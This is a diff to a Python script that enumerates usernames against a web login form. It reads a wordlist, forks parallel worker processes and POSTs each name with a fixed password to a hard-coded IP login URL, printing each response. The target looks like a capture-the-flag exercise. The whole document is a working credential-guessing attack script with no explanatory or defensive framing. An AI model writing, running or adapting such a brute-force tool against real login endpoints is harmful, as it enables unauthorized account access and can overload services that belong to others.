@@ -1,9 +1,17 @@
 import requests
 from bs4 import BeautifulSoup
+import time
 import os
 
-def request(name, password):
-    url = 'http://35.190.155.168/74760c4b15/login'
+def test_url(url):
+    r = requests.get(url)
+    if r.status_code == 404:
+        print('Code: {}'.format(r.status_code))
+        exit()
+    return 'Connection OK'
+
+def request(name, password, url):
+
     payload = {'username' : name, 'password' : password}
     r = requests.post(url, payload)
     soup = BeautifulSoup(r.text, 'html.parser')
@@ -11,12 +19,12 @@ def request(name, password):
     return page
 
 def load():
-    size = 10
     try:
         with open('wordlist.txt', 'r') as wl:
             wl = wl.readlines()
             wl = list(map(lambda x: x.replace('\n',''), wl))
             #Split in small groups
+            size = int(len(wl)/1000)+1
             chunks = [wl[x:x+size] for x in range(0, len(wl), size)]
             return chunks
     except FileNotFoundError:
@@ -24,15 +32,21 @@ def load():
         exit()
 
 def loop():
+    code = '709156911b'
+    url = 'http://35.190.155.168/'+code+'/login'
     password = 'pass'
-    list = load()
-    count = len(list)
+    lista = load()
+    count = len(lista)
+    test_url(url)
     while 1:
         pid = os.fork()
         if pid == 0:
-            child(list[count], password)
-        count-=1
+
+            child(lista[count-1], password, url)
         if count==1:
+            os.waitpid(pid,0)
+        count-=1
+        if count==0:
             break
     exit()
 
@@ -41,10 +55,10 @@ def parent(users, password):
         out = request(username, password)
         print('{}\t\t\t{}:{}'.format(out, username, password))
 
-def child(users, password):
+def child(users, password, url):
     print('Created child', os.getpid())
     for username in users:
-        out = request(username, password)
+        out = request(username, password, url)
         print('{}\t\t\t{}:{}'.format(out, username, password))
     exit()
 
